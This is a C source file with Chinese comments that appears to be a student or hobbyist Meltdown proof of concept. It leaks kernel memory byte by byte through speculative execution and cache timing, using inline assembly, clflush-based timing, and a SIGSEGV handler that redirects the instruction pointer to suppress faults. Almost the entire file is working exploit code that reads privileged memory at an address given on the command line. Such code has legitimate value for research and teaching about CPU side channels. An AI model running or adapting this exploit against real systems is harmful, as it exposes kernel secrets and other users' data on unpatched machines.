#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <x86intrin.h>
#define PAGE_SIZE 4 * 1024
#define ARRAY_SIZE 256
#define ATTEMP 5
#define MOREINFO 1

static char target_array[ARRAY_SIZE * PAGE_SIZE];
static int check_array[ARRAY_SIZE];
int cache_threshold;

/*获取访问目标地址的时间*/
static int get_access_time(volatile char *addr)
{
	int time1, time2;
	int zero = 0;
	time1 = __rdtscp(&zero);
	(void)*addr;
	time2 = __rdtscp(&zero);
	return time2 - time1;
}

extern char stopspeculate[];

static void speculate(unsigned long addr) {
	asm volatile (
		/*塞一些操作保证后面的攻击代码可以乱序执行*/
		".rept 500\n\t"
		"add $0x987,%%rax\n\t"
		".endr\n\t"
		/*参考论文中的三行核心攻击代码*/
		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"
		/*抑制段错误手段，发生段错误后使此函数直接返回，详细见后*/
		"stopspeculate: \n\t"
		"nop\n\t"
		:
	: [target] "r" (target_array),
		[addr] "r" (addr)
		: "rax", "rbx"
		);
}


int attackonebyte(int fd, unsigned long addr)
{
	int i, max = -1, max_i = 0, j, k;
	static char buf[256];
	memset(check_array, 0, sizeof(check_array));
	for (i = 0; i < 1000; i++) 
	{
		max_i = pread(fd, buf, sizeof(buf), 0);
		if (max_i < 0) 
		{
			perror("pread");
			break;
		}
		for (j = 0; j < ARRAY_SIZE; j++)
			_mm_clflush(&target_array[j * PAGE_SIZE]);
		speculate(addr);
		int time;
		/*检查target数组中那些项进入了缓存*/
		volatile char *addr;
		for (j = 0; j <ARRAY_SIZE; j++) 
		{
			addr = &target_array[j * PAGE_SIZE];
			time = get_access_time(addr);
			if (time*time<cache_threshold)
				check_array[j]++;
		}
	}
	max_i = -1;
	for (i = 0; i < ARRAY_SIZE; i++) 
	{
		if (check_array[i] > max) 
		{
			max = check_array[i];
			max_i = i;
		}
	}
	return max_i;
}
/*以下是抑制段错误的函数，参照https://github.com/paboldin/meltdown-exploit.git*/
/*大致策略是修改sigaction使发生段错误时的操作变为一条nop指令*/
/*此函数将输入信号断对应服务程序入口改到stopspeculate处，此处为一条空指令并马上返回*/
void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
	return;
}
/*此函数设置段错误信号SIGSEGV的SA_SIGINFO标志位，表示激活替代的信号处理程序，这里是nop*/
int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}
/*设置缓存时间阀值，参考github项目*/
void set_cached_threshold(void)
{
	long cached, uncached;
	int i;
	for (uncached = 0, i = 0; i < 10000; i++) 
	{
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}
	for (cached = 0, i = 0; i < 10000; i++)
		cached += get_access_time(target_array);
	cached /= 10000;
	uncached /= 10000;
	cache_threshold = cached * uncached;
}
int main(int argc, char *argv[])
{
	int i, ret, j, max, max_i, k;
	int fd;
	unsigned long addr;
	int size = 10;
	static char record[50];
	static int attemp[ARRAY_SIZE];
	sscanf(argv[1], "%lx", &addr);
	sscanf(argv[2], "%dx", &size);
	ret = set_signal();
	memset(target_array, 1, sizeof(target_array));
	set_cached_threshold();
	fd = open("/proc/version", O_RDONLY);
	for (i = 0; i < size; i++)
	{
		memset(attemp, 0, sizeof(attemp));
		max = -1; max_i = 0;
		for (j = 0; j<ATTEMP; j++)
		{
			ret = attackonebyte(fd, addr);
#if MOREINFO
			printf("%c ", isprint(ret) ? ret : ' ');
#endif
			attemp[ret]++;
			for (k = 0; k < ARRAY_SIZE; k++)
			{
				if (attemp[k] > max&&isprint(k))
				{
					max = attemp[k];
					max_i = k;
				}
			}
		}
		ret = max_i;
		printf("read:%lx data=%2x %c", addr, ret, isprint(ret) ? ret : ' ');
#if MOREINFO
		printf("  %din%d", max, ATTEMP);
#endif
		printf("\n");
		record[i] = isprint(ret) ? ret : ' ';
		addr++;
	}
	printf("ALL information:\n%s\n", record);
	close(fd);
	return 0;
}
